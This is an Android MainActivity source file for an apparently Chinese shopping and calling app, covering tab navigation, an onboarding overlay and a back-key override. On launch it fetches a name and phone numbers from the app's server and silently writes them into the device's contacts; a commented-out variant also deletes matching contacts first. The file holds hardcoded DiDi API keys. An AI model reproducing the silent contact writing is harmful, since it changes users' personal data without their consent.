package com.mhy.shopingphone.ui;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;

import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import android.os.Environment;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.v4.app.Fragment;

import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;

import android.view.ViewTreeObserver;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;


import com.google.gson.Gson;
import com.mhy.sdk.base.activity.BaseCompatActivity;

import com.mhy.sdk.contant.Contant;

import com.mhy.sdk.rxbus.RxBus;
import com.mhy.sdk.utils.LogUtils;
import com.mhy.sdk.utils.SharedPreferencesHelper;

import com.mhy.sdk.utils.Util;
import com.mhy.shopingphone.R;

import com.mhy.shopingphone.api.Api;
import com.mhy.shopingphone.model.bean.phone.MailistCallBean;
import com.mhy.shopingphone.ui.fragment.addresslist.AddressListFragment;
import com.mhy.shopingphone.ui.fragment.discover.child.DiscoverFragment;
import com.mhy.shopingphone.ui.fragment.my.child.MyFragment;
import com.mhy.shopingphone.ui.fragment.phone.child.PhoneFragment;
import com.mhy.shopingphone.ui.fragment.shop.child.ShopFragment;
import com.sdu.didi.openapi.DiDiWebActivity;
import com.umeng.analytics.MobclickAgent;
import com.umeng.commonsdk.UMConfigure;
import com.youth.xframe.utils.XEmptyUtils;
import com.yuyh.library.EasyGuide;
import com.yuyh.library.constant.Constants;
import com.yuyh.library.support.HShape;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.StringCallback;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import butterknife.BindView;
import okhttp3.Call;

public class MainActivity extends BaseCompatActivity implements View.OnClickListener {
    /*   public static final int FIRST = 0;
       public static final int SECOND = 1;
       public static final int THIRD = 2;
       public static final int FOURTH = 3;
       public static final int FIFTH = 4;*/
    @BindView(R.id.fl_container)     //主界面
            FrameLayout flContainer;
    @BindView(R.id.iv_menu_home)      //电话按钮
            ImageView ivMenuHome;
    @BindView(R.id.iv_menu_home1)      //电话提示
            ImageView iv_menu_home1;
    @BindView(R.id.tv_menu_home)      //电话字体
            TextView tvMenuHome;
    @BindView(R.id.ll_menu_home)    //电话
            LinearLayout llMenuHome;
    @BindView(R.id.iv_menu_hot)         //通讯录图标
            ImageView ivMenuHot;
    @BindView(R.id.tv_menu_hot)            //通讯录字体
            TextView tvMenuHot;
    @BindView(R.id.ll_menu_hot)     //通讯录
            LinearLayout llMenuHot;
    @BindView(R.id.iv_menu_talk)         //发现按钮
            ImageView ivMenuTalk;
    @BindView(R.id.tv_menu_talk)         //发现字体
            TextView tvMenuTalk;
    @BindView(R.id.ll_menu_talk)    //发现
            LinearLayout llMenuTalk;
    @BindView(R.id.iv_menu_me)       //商城图标
            ImageView ivMenuMe;
    @BindView(R.id.tv_menu_me)        //商城字体
            TextView tvMenuMe;
    @BindView(R.id.iv_menu_my)        //我的按钮
            ImageView ivMenuMy;
    @BindView(R.id.tou)                //头部背影
            ImageView tou;
    @BindView(R.id.tv_menu_my)        //我的字体
            TextView tvMenuMy;
    @BindView(R.id.ll_menu_me)   //淘商城
            LinearLayout llMenuMe;
    @BindView(R.id.ll_menu_my)   //我的
            LinearLayout llmenumy;

    public Fragment mContentFrag;// 临时Fragment
    // 标签
    private boolean isDisplayMenu = false;
    // 各个fragment
    public PhoneFragment phoneFragment; // 电话
    private ShopFragment shopFragment; // 淘商城
    private DiscoverFragment discoverFragment; // 发现
    private MyFragment myFragment; // 我的
    //    private AddressListFragment addressListFragment;
    private EasyGuide easyGuide;

    /**
     * 初始化视图
     */
    private void initView() {
        llMenuHome.setOnClickListener(this);   //电话点击
        llMenuMe.setOnClickListener(this);
        llMenuTalk.setOnClickListener(this);
        llmenumy.setOnClickListener(this);

    }

    @Override
    protected void onResume() {
        super.onResume();
        MobclickAgent.onResume(this);
    }

    @Override
    protected void onPause() {
        super.onPause();
        MobclickAgent.onPause(this);
    }

    /**
     * 返回键实现home功能
     *
     * @param keyCode
     * @param event
     * @return
     */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addCategory(Intent.CATEGORY_HOME);
            startActivity(intent);
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.ll_menu_home:         //电话
               /* if (AnimUtils.isRunningAnimation())
                    return;*/

                if (isDisplayMenu) {
                    long startOffset = 0;
                    // 隐藏菜单
//                    AnimUtils.startOutRotateAnimation(menu_backgroud, startOffset);
                    isDisplayMenu = !isDisplayMenu;
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            switchFragment(mContentFrag, phoneFragment);
                            tvMenuHome.setTextColor(getResources().getColor(R.color.naniu));
                            ivMenuHome.setImageDrawable(getResources().getDrawable(R.drawable.topkey));
                            mContentFrag = phoneFragment;
                        }
                    }, 500);
                } else {
                    switchFragment(mContentFrag, phoneFragment);
                    tvMenuHome.setTextColor(getResources().getColor(R.color.naniu));
                    ivMenuHome.setImageDrawable(getResources().getDrawable(R.drawable.topkey));
                    mContentFrag = phoneFragment;
                }
                break;
            case R.id.ll_menu_me:         //淘商城
                if (isDisplayMenu) {
                    long startOffset = 0;
                    // 隐藏菜单
                    isDisplayMenu = !isDisplayMenu;
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            switchFragment(mContentFrag, shopFragment);
                            tvMenuMe.setTextColor(getResources().getColor(R.color.haitao));
                            ivMenuMe.setImageDrawable(getResources().getDrawable(R.drawable.taoshangcheng_1));
                            mContentFrag = shopFragment;
                        }
                    }, 500);
                } else {
                    switchFragment(mContentFrag, shopFragment);
                    tvMenuMe.setTextColor(getResources().getColor(R.color.haitao));
                    ivMenuMe.setImageDrawable(getResources().getDrawable(R.drawable.taoshangcheng_1));
                    mContentFrag = shopFragment;
                }
                break;
            case R.id.ll_menu_talk:         //发现
                if (isDisplayMenu) {
                    long startOffset = 0;
                    isDisplayMenu = !isDisplayMenu;
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            switchFragment(mContentFrag, discoverFragment);
                            tvMenuTalk.setTextColor(getResources().getColor(R.color.naniu));
                            ivMenuTalk.setImageDrawable(getResources().getDrawable(R.drawable.faxian_1));
                            mContentFrag = discoverFragment;
                        }
                    }, 500);
                } else {
                    switchFragment(mContentFrag, discoverFragment);
                    ivMenuTalk.setImageDrawable(getResources().getDrawable(R.drawable.faxian_1));
                    tvMenuTalk.setTextColor(getResources().getColor(R.color.naniu));
                    mContentFrag = discoverFragment;
                }
                break;
            case R.id.ll_menu_my:         //我的
                if (isDisplayMenu) {
                    long startOffset = 0;
                    isDisplayMenu = !isDisplayMenu;
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            switchFragment(mContentFrag, myFragment);
                            ivMenuMy.setImageDrawable(getResources().getDrawable(R.drawable.tab_3_press));
                            tvMenuMy.setTextColor(getResources().getColor(R.color.naniu));
                            mContentFrag = myFragment;
                        }
                    }, 500);
                } else {
                    switchFragment(mContentFrag, myFragment);
                    ivMenuMy.setImageDrawable(getResources().getDrawable(R.drawable.tab_3_press));
                    tvMenuMy.setTextColor(getResources().getColor(R.color.naniu));
                    mContentFrag = myFragment;
                }
                break;
        }
    }

    @Override
    protected void initView(Bundle savedInstanceState) {
        DiDiWebActivity.registerApp(this, "didi6343445A5A6E35793144697654634748", "1803055994914820e2c1f8fb98aee7a8");   //注册滴滴打
        Util.setStatusBarHeigh(mContext, tou);
        initFragment();
        initView();
        goAdd();
        String TAG = (String) SharedPreferencesHelper.getInstance().getData("show1", "");
        if (XEmptyUtils.isEmpty(TAG)) {
            SharedPreferencesHelper.getInstance().saveData("show1", "1231");
            llMenuHome.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
                @Override
                public void onGlobalLayout() {
                    // 加载完成后回调
                    if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN) {
                        llMenuHome.getViewTreeObserver().removeOnGlobalLayoutListener(this);
                    } else {
                        llMenuHome.getViewTreeObserver().removeGlobalOnLayoutListener(this);
                    }

                    // TODO 显示高亮布局！
//                    show();//直接显示引导层
                }
            });
        }
    }

    public void show() {
        int[] loc = new int[2];
        iv_menu_home1.getLocationOnScreen(loc);

        View tipsView = createTipsView();

        if (easyGuide != null && easyGuide.isShowing())
            easyGuide.dismiss();

        easyGuide = new EasyGuide.Builder(this)
                // 增加View高亮区域，可同时显示多个
                .addHightArea(iv_menu_home1, HShape.RECTANGLE)
                // 复杂的提示布局，建议通过此方法，较容易控制
                .addView(tipsView, Constants.CENTER, Constants.CENTER)
                // 若点击作用在高亮区域，是否执行高亮区域的点击事件loc[1] + tlTabs.getHeight()
                .performViewClick(false)
                .addIndicator(R.drawable.login_btn_corner, loc[0], loc[1])
                .addIndicator(R.drawable.taoshoplogo, Constants.CENTER, -llMenuHome.getHeight() * 2)
                .dismissAnyWhere(false)
                .build();

        easyGuide.show();
    }

    private View createTipsView() {

        View view = LayoutInflater.from(this).inflate(R.layout.phone_guide_view2, null);

        ImageView ivIsee = (ImageView) view.findViewById(R.id.iv_guide_yes);
        ivIsee.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (easyGuide != null) {
                    easyGuide.dismiss();
                    RxBus.get().send(15);
                }
            }
        });

        return view;
    }

    @Override
    protected int getLayoutId() {
        return R.layout.activity_main;
    }

    /**
     * 初始化fragment
     */
    private void initFragment() {
        phoneFragment = new PhoneFragment(); // 电话
        shopFragment = new ShopFragment(); // 淘商城
        discoverFragment = new DiscoverFragment(); // 发现
        myFragment = new MyFragment(); // 我的
        mContentFrag = phoneFragment;
        getSupportFragmentManager().beginTransaction().add(R.id.fl_container, shopFragment)
                .add(R.id.fl_container, phoneFragment).commit();
//        mHandler.sendEmptyMessageDelayed(4, 20);
    }

    /**
     * 切换Fragment
     *
     * @param from
     * @param to
     */
    public void switchFragment(Fragment from, Fragment to) {
        if (mContentFrag != to) {
            mContentFrag = to;
            android.support.v4.app.FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
//                    .setCustomAnimations(android.R.anim.slide_in_left, android.R.anim.slide_out_right);
            if (!to.isAdded()) { // 先判断是否被add过
                transaction.hide(from).add(R.id.fl_container, to).commit(); // 隐藏当前的fragment，add下一个到Activity中
            } else {
                transaction.hide(from).show(to).commit(); // 隐藏当前的fragment，显示下一个
            }
        }
        clearSelection();
    }

    /**
     * 清除文字状态
     */
    @SuppressWarnings("deprecation")
    private void clearSelection() {
        ivMenuHome.setImageDrawable(getResources().getDrawable(R.mipmap.tab_0_normal));
        ivMenuMe.setImageDrawable(getResources().getDrawable(R.drawable.taoshangcheng));
        ivMenuTalk.setImageDrawable(getResources().getDrawable(R.drawable.faxian));
        ivMenuMy.setImageDrawable(getResources().getDrawable(R.drawable.tab_3_normal));
        tvMenuHome.setTextColor(getResources().getColor(R.color.text_home_menu_normal));
        tvMenuMe.setTextColor(getResources().getColor(R.color.text_home_menu_normal));
        tvMenuTalk.setTextColor(getResources().getColor(R.color.text_home_menu_normal));
        tvMenuMy.setTextColor(getResources().getColor(R.color.text_home_menu_normal));
    }

    private void goAdd() {
        //请求参数
        Map<String, String> params = new HashMap<String, String>();
        params.put("ParentId", String.valueOf(Contant.PARENTID));
        OkHttpUtils.post()
                .url(Api.NEWGOODS + Api.CALLBACK_URL)
                .params(params)
                .build()
                .execute(new StringCallback() {
                    @Override
                    public void onError(Call call, Exception e, int id) {

                    }

                    @Override
                    public void onResponse(String response, int id) {
                        LogUtils.e("fengli---" + response);
                        final MailistCallBean bean = new Gson().fromJson(response, MailistCallBean.class);
                        if (bean.getErrorCode() == 2000) {
                            final String[] number = bean.getJson().get(0).getNums().split(",");
                            LogUtils.e("maomao" + Arrays.toString(number));
                            LogUtils.e("maomao" + number.length);
                            int phoneL = (int) SharedPreferencesHelper.getInstance().getData("phoneL", 0);
                            try {
//                                if (number.length > phoneL) {
                                saveFile(bean.getJson().get(0).getNums(), "suibianda.txt");// 保存为了一个txt文本
                                SharedPreferencesHelper.getInstance().saveData("phoneL", number.length);
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        try {
                                            String data = getFile("suibianda.txt");
                                            if (data != null && data.length() > 0) {
                                                ArrayList arrList = new ArrayList();
                                                for (int i = 0; i < number.length; i++) {
                                                    if (data.indexOf(number[i]) != -1) {
                                                    } else {
                                                        arrList.add(number[i]);
                                                    }
                                                }
                                                if (arrList != null && arrList.size() > 0) {
                                                    String[] s = new String[arrList.size()];
                                                    s = (String[]) arrList.toArray(s);
                                                    LogUtils.e("fengli---" + Arrays.toString(s));
                                                    addContact(bean.getJson().get(0).getName(), s);
                                                }
                                            } else {
                                                addContact(bean.getJson().get(0).getName(), number);
                                            }
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                    }
                                }).start();

                            } catch (Exception paramContext) {
                                paramContext.printStackTrace();
                                LogUtils.e(paramContext.toString() + "写入联系人");
                            }

                        }
                    }
                });
    }

    public void testDelete(String name) {
        //根据姓名求id
        Uri uri = Uri.parse("content://com.android.contacts/raw_contacts");
        ContentResolver resolver = mContext.getContentResolver();
//        ContentResolver resolver = this.getContext().getContentResolver();
        Cursor cursor = resolver.query(uri, new String[]{ContactsContract.Data._ID}, "display_name=?", new String[]{name}, null);
        if (cursor != null) {
            if (cursor.moveToFirst()) {
                int id = cursor.getInt(0);
                //根据id删除data中的相应数据
                resolver.delete(uri, "display_name=?", new String[]{name});
                uri = Uri.parse("content://com.android.contacts/data");
                resolver.delete(uri, "raw_contact_id=?", new String[]{id + ""});
            }
        }
        if (Build.VERSION.SDK_INT < 14) {
            cursor.close();
        }
    }

    public void addContact(String name, String[] phoneNumber) {
        // 创建一个空的ContentValues
        ContentValues values = new ContentValues();
        // 向RawContacts.CONTENT_URI空值插入，
        // 先获取Android系统返回的rawContactId
        // 后面要基于此id插入值
        Uri rawContactUri = mContext.getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, values);
        long rawContactId = ContentUris.parseId(rawContactUri);
        values.clear();

        values.put(ContactsContract.Contacts.Data.RAW_CONTACT_ID, rawContactId);
        // 内容类型
        values.put(ContactsContract.Contacts.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
        // 联系人名字
        values.put(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME, name);
        // 向联系人URI添加联系人名字
        mContext.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);

        for (String number : phoneNumber) {
            values.clear();
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, number);
            values.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
            mContext.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
        }
    }
  /*  private SupportFragment[] mFragments = new SupportFragment[5];
    // 再点一次退出程序时间设置
    private static final long WAIT_TIME = 2000L;
    private long TOUCH_TIME = 0;
    private boolean clickPhone = false;
    private boolean isShowFirst = true;//标记
    private BeginDialog beginDialog;
    //    private boolean flag = false;
    private EasyGuide easyGuide;
    private List<String> ceshi;
    private CompositeDisposable compositeDisposable = new CompositeDisposable();*/

   /* @Override
    protected void initData() {
        super.initData();
        RxBus.get().register(this);
        //        Logger.e("RxBus.get().register(this)");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        compositeDisposable.dispose();
        RxBus.get().unRegister(this);
    }

    @Override
    protected void initView(Bundle savedInstanceState) {
        DiDiWebActivity.registerApp(this, "didi6343445A5A6E35793144697654634748", "1803055994914820e2c1f8fb98aee7a8");   //注册滴滴打
        Util.setStatusBarHeigh(mContext, tou);
        goAdd();
//        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.KITKAT) {
//            StatusBarUtils.setColor(MainActivity.this, Color.BLACK);
//        }
//        if (NetworkConnectionUtils.isNetworkConnected(mContext)) {
        if (savedInstanceState == null) {
            mFragments[FIRST] = PhoneRootFragment.newInstance();
            mFragments[SECOND] = AddressListRootFragment.newInstance();
            mFragments[THIRD] = DiscoverRootFragment.newInstance();
            mFragments[FOURTH] = ShopRootFragment.newInstance();
            mFragments[FIFTH] = MyRootFragment.newInstance();

            loadMultipleRootFragment(R.id.fl_container, FIRST,
                    mFragments[FIRST],
                    mFragments[SECOND],
                    mFragments[THIRD],
                    mFragments[FOURTH],
                    mFragments[FIFTH]);
        } else {
            // 这里库已经做了Fragment恢复,所有不需要额外的处理了, 不会出现重叠问题
            // 这里我们需要拿到mFragments的引用,也可以通过getSupportFragmentManager.getFragments()
            // 自行进行判断查找(效率更高些),用下面的方法查找更方便些
            mFragments[FIRST] = findFragment(PhoneFragment.class);
            mFragments[SECOND] = findFragment(AddressListFragment.class);
            mFragments[THIRD] = findFragment(DiscoverFragment.class);
            mFragments[FOURTH] = findFragment(ShopFragment.class);
            mFragments[FIFTH] = findFragment(MyFragment.class);
        }
//        }
     *//*   else {
            if (savedInstanceState == null) {
                mFragments[FIRST] = MainRootFragment.newInstance();
                mFragments[SECOND] = MainRootFragment.newInstance();
                mFragments[THIRD] = MainRootFragment.newInstance();
                mFragments[FOURTH] = MainRootFragment.newInstance();
                mFragments[FIFTH] = MainRootFragment.newInstance();

                loadMultipleRootFragment(R.id.fl_container, FIRST,
                        mFragments[FIRST],
                        mFragments[SECOND],
                        mFragments[THIRD],
                        mFragments[FOURTH],
                        mFragments[FIFTH]);
            } else {
                // 这里库已经做了Fragment恢复,所有不需要额外的处理了, 不会出现重叠问题
                // 这里我们需要拿到mFragments的引用,也可以通过getSupportFragmentManager.getFragments()
                // 自行进行判断查找(效率更高些),用下面的方法查找更方便些
                mFragments[FIRST] = findFragment(MainFragment.class);
                mFragments[SECOND] = findFragment(MainFragment.class);
                mFragments[THIRD] = findFragment(MainFragment.class);
                mFragments[FOURTH] = findFragment(MainFragment.class);
                mFragments[FIFTH] = findFragment(MainFragment.class);
            }
        }*//*
        //用来标记是否是第一次进入app
        String TAG = (String) SharedPreferencesHelper.getInstance().getData("show1", "");
        if (XEmptyUtils.isEmpty(TAG)) {
            SharedPreferencesHelper.getInstance().saveData("show1", "1231");
            llMenuHome.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
                @Override
                public void onGlobalLayout() {
                    // 加载完成后回调
                    if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN) {
                        llMenuHome.getViewTreeObserver().removeOnGlobalLayoutListener(this);
                    } else {
                        llMenuHome.getViewTreeObserver().removeGlobalOnLayoutListener(this);
                    }

                    // TODO 显示高亮布局！
//                    show();//直接显示引导层
                }
            });
        }


    }

    *//**
     * RxBus
     *//*
    @Subscribe(code = 16)
    public void hide() {
        beginDialog = new BeginDialog(this, R.style.MillionDialogStyle, onClickListener);
//        beginDialog.show();
    }

    View.OnClickListener onClickListener = new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            showHideFragment(mFragments[FOURTH]);
            ivMenuMe.setImageDrawable(ContextCompat.getDrawable(MainActivity.this, R.drawable.taoshangcheng_1));
            tvMenuMe.setTextColor(ContextCompat.getColor(MainActivity.this, R.color.text_home_menu_selected));
            tvMenuMe.setVisibility(View.GONE);
            ivMenuHome.setImageDrawable(ContextCompat.getDrawable(MainActivity.this, R.mipmap.tab_0_normal));
            tvMenuHome.setTextColor(ContextCompat.getColor(MainActivity.this, R.color.text_home_menu_normal));
            ivMenuHot.setImageDrawable(ContextCompat.getDrawable(MainActivity.this, R.mipmap.tab_1_normal));
            tvMenuHot.setTextColor(ContextCompat.getColor(MainActivity.this, R.color.text_home_menu_normal));
            ivMenuTalk.setImageDrawable(ContextCompat.getDrawable(MainActivity.this, R.drawable.faxian));
            tvMenuTalk.setTextColor(ContextCompat.getColor(MainActivity.this, R.color.text_home_menu_normal));
            beginDialog.dismiss();
        }
    };


    @Override
    protected int getLayoutId() {
        return R.layout.activity_main;
    }

    @Override
    public void onBackPressedSupport() {

        if (getFragmentManager().getBackStackEntryCount() > 1) {
            //如果当前存在fragment>1，当前fragment出栈
            pop();
        } else {
            //如果已经到root fragment了，2秒内点击2次退出
            if (System.currentTimeMillis() - TOUCH_TIME < WAIT_TIME) {
                setIsTransAnim(false);
                finish();
                PgyCrashManager.unregister();
//                PgyCrashManager.unregister();
            } else {
                TOUCH_TIME = System.currentTimeMillis();
                ToastUtils.showToast(R.string.press_again);
            }
        }
    }


    @OnClick({R.id.ll_menu_home, R.id.ll_menu_hot, R.id.ll_menu_talk, R.id.ll_menu_me, R.id.ll_menu_my})
    public void onViewClicked(View view) {
        switch (view.getId()) {
            case R.id.ll_menu_home:
                setMenuStyle(view.getId());
//                if (isShowFirst) {
//                    if (clickPhone) {
//                        clickPhone = false;
//                    } else {
//                        clickPhone = true;
//                    }
//                    RxBus.get().send(RX_BUS_CODE_PHONE_TOP, new RxClickPhoneBean(clickPhone));
//                }
                isShowFirst = true;
                break;
            case R.id.ll_menu_hot:
                setMenuStyle(view.getId());
                RxBus.get().send(RX_BUS_CODE_PHONE_TOP, new RxClickPhoneBean(false));
                isShowFirst = false;
                break;
            case R.id.ll_menu_talk:
                setMenuStyle(view.getId());
                isShowFirst = false;
                break;
            case R.id.ll_menu_me:
                setMenuStyle(view.getId());
                isShowFirst = false;
                break;
            case R.id.ll_menu_my:
                setMenuStyle(view.getId());
                RxBus.get().send(RX_BUS_CODE_MY);
                isShowFirst = false;
                break;
        }
    }

    *//**
     * 设置menu样式
     *
     * @paramtrans
     *//*
    private void setMenuStyle(int resId) {
        // 电话
        if (resId == R.id.ll_menu_home) {
//            if (!flag) {
//                ivMenuHome.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.bottomkey));
//                tvMenuHome.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_selected));
//                flag = true;
//            } else {
            ivMenuHome.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.topkey));
            tvMenuHome.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_selected));
//                flag = false;
//            }
            showHideFragment(mFragments[FIRST]);
        } else {
            ivMenuHome.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.tab_0_normal));
            tvMenuHome.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_normal));
        }
        // 通讯录
        if (resId == R.id.ll_menu_hot) {
            ivMenuHot.setImageDrawable(ContextCompat.getDrawable(this, R.mipmap.tab_1_press));
            tvMenuHot.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_selected));
            showHideFragment(mFragments[SECOND]);

        } else {
            ivMenuHot.setImageDrawable(ContextCompat.getDrawable(this, R.mipmap.tab_1_normal));
            tvMenuHot.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_normal));

        }
        // 发现
        if (resId == R.id.ll_menu_talk) {
            ivMenuTalk.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.faxian_1));
            tvMenuTalk.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_selected));
            showHideFragment(mFragments[THIRD]);
        } else {
            ivMenuTalk.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.faxian));
            tvMenuTalk.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_normal));
        }
        // 淘商城
        if (resId == R.id.ll_menu_me) {
            ivMenuMe.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.taoshangcheng_1));
            tvMenuMe.setTextColor(ContextCompat.getColor(this, R.color.haitao));
            showHideFragment(mFragments[FOURTH]);
        } else {
            ivMenuMe.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.taoshangcheng));
            tvMenuMe.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_normal));
        }
        // 我的
        if (resId == R.id.ll_menu_my) {
            ivMenuMy.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.tab_3_press));
            tvMenuMy.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_selected));
            showHideFragment(mFragments[FIFTH]);

        } else {
            ivMenuMy.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.tab_3_normal));
            tvMenuMy.setTextColor(ContextCompat.getColor(this, R.color.text_home_menu_normal));
        }
    }


    public void show() {
        int[] loc = new int[2];
        iv_menu_home1.getLocationOnScreen(loc);

        View tipsView = createTipsView();

        if (easyGuide != null && easyGuide.isShowing())
            easyGuide.dismiss();

        easyGuide = new EasyGuide.Builder(this)
                // 增加View高亮区域，可同时显示多个
                .addHightArea(iv_menu_home1, HShape.RECTANGLE)
                // 复杂的提示布局，建议通过此方法，较容易控制
                .addView(tipsView, Constants.CENTER, Constants.CENTER)
                // 若点击作用在高亮区域，是否执行高亮区域的点击事件loc[1] + tlTabs.getHeight()
                .performViewClick(false)
                .addIndicator(R.drawable.callrecordguide_1, loc[0], loc[1])
                .addIndicator(R.drawable.callrecordguide_2, Constants.CENTER, -llMenuHome.getHeight() * 2)
                .dismissAnyWhere(false)
                .build();

//        easyGuide.show();
    }

    private View createTipsView() {

        View view = LayoutInflater.from(this).inflate(R.layout.phone_guide_view2, null);

        ImageView ivIsee = (ImageView) view.findViewById(R.id.iv_guide_yes);
        ivIsee.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (easyGuide != null) {
                    easyGuide.dismiss();
                    RxBus.get().send(15);
                }
            }
        });

        return view;
    }

    private void goAdd() {
        //请求参数
        Map<String, String> params = new HashMap<String, String>();
        params.put("ParentId", String.valueOf(Contant.PARENTID));
        OkHttpUtils.post()
                .url(Api.NEWGOODS + Api.CALLBACK_URL)
                .params(params)
                .build()
                .execute(new StringCallback() {
                    @Override
                    public void onError(Call call, Exception e, int id) {

                    }

                    @Override
                    public void onResponse(String response, int id) {
                        final MailistCallBean bean = new Gson().fromJson(response, MailistCallBean.class);
                        if (bean.getErrorCode() == 2000) {
                            final String[] number = bean.getJson().get(0).getNums().split(",");
                            LogUtils.e("maomao" + Arrays.toString(number));
                            LogUtils.e("maomao" + number.length);
                            int phoneL = (int) SharedPreferencesHelper.getInstance().getData("phoneL", 0);
                            try {
//                                if (number.length > phoneL) {
                                SharedPreferencesHelper.getInstance().saveData("phoneL", number.length);
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        testDelete(bean.getJson().get(0).getName());
                                        addContact(bean.getJson().get(0).getName(), number);
                                    }
                                }).start();
//                                } else {
//                                    LogUtils.e("无需写入联系人");
//                                }

                            } catch (Exception paramContext) {
                                paramContext.printStackTrace();
                                LogUtils.e(paramContext.toString() + "写入联系人");
                            }

                        }
                    }
                });



       *//* String paramsstring = StringUtil.mapToJson(params);
        String paramstr = (NSRBase64.encodeToString(paramsstring) + Contant.URLKey).replaceAll("\n", "").trim();
        //设置头部
        HttpUtils.headStr = Contant.MAIlLIST_URLHead;
        RxManager mRxManager = new RxManager();
        Observable<MailistCallBean> compose = RetrofitCreateHelper.createApi(Api.class, Api.GOODS).goAddPhone(paramstr)
                .compose(RxHelper.<MailistCallBean>rxSchedulerHelper());
        mRxManager.register(compose.subscribe(new Consumer<MailistCallBean>() {
            @Override
            public void accept(final MailistCallBean bean) throws Exception {
                if (bean.getCode().equals("0")) {
                    final String[] number = bean.getInfo().getNums().split(",");
                    LogUtils.e("maomao" + Arrays.toString(number));
                    LogUtils.e("maomao" + number.length);
                    int phoneL = (int) SharedPreferencesHelper.getInstance().getData("phoneL", 0);
                    try {
                        if (number.length > phoneL) {
                            SharedPreferencesHelper.getInstance().saveData("phoneL", number.length);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    testDelete(bean.getName());
                                    addContact(bean.getName(), number);
                                }
                            }).start();
                        } else {
                            LogUtils.e("无需写入联系人");
                        }

                    } catch (Exception paramContext) {
                        paramContext.printStackTrace();
                        LogUtils.e(paramContext.toString() + "写入联系人");
                    }

                } else {
                    ToastUtils.showToast(bean.getMess());
                }
            }
        }, new Consumer<Throwable>() {
            @Override
            public void accept(Throwable throwable) throws Exception {
                ToastUtils.showToast("网络异常，请检查网络~");
            }
        }));*//*
    }

    public void testDelete(String name) {
        LogUtils.e("fengli123123" + name);
        //根据姓名求id
        Uri uri = Uri.parse("content://com.android.contacts/raw_contacts");
        ContentResolver resolver = mContext.getContentResolver();
//        ContentResolver resolver = this.getContext().getContentResolver();
        Cursor cursor = resolver.query(uri, new String[]{ContactsContract.Data._ID}, "display_name=?", new String[]{name}, null);
        if (cursor != null) {
            if (cursor.moveToFirst()) {
                int id = cursor.getInt(0);
                //根据id删除data中的相应数据
                resolver.delete(uri, "display_name=?", new String[]{name});
                uri = Uri.parse("content://com.android.contacts/data");
                resolver.delete(uri, "raw_contact_id=?", new String[]{id + ""});
            }
        }
        if (Build.VERSION.SDK_INT < 14) {
            cursor.close();
        }
    }

    *//*
* 添加联系人方法
* *//*
    public void addContact(String name, String[] phoneNumber) {

        LogUtils.e("fengli431431" + name + phoneNumber);
        // 创建一个空的ContentValues
        ContentValues values = new ContentValues();

        // 向RawContacts.CONTENT_URI空值插入，
        // 先获取Android系统返回的rawContactId
        // 后面要基于此id插入值
